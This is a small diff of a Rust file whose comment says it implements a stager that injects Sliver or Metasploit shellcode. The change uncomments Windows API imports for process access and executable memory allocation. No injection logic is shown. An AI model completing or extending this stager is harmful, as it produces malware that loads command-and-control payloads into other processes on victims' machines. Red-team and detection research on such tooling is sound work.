@@ -1,11 +1,11 @@
 // Implement a stager for Shellcode Injection of Sliver or Metasploit Shellcode
 
-//extern crate kernel32;
+extern crate kernel32;
 use clap::Parser;
 use reqwest;
 use std::ptr;
-//use sysinfo::{PidExt, ProcessExt, System, SystemExt};
-//use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
+use sysinfo::{PidExt, ProcessExt, System, SystemExt};
+use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
 
 #[derive(Parser, Debug)]
 #[command(version, about, long_about = None)]
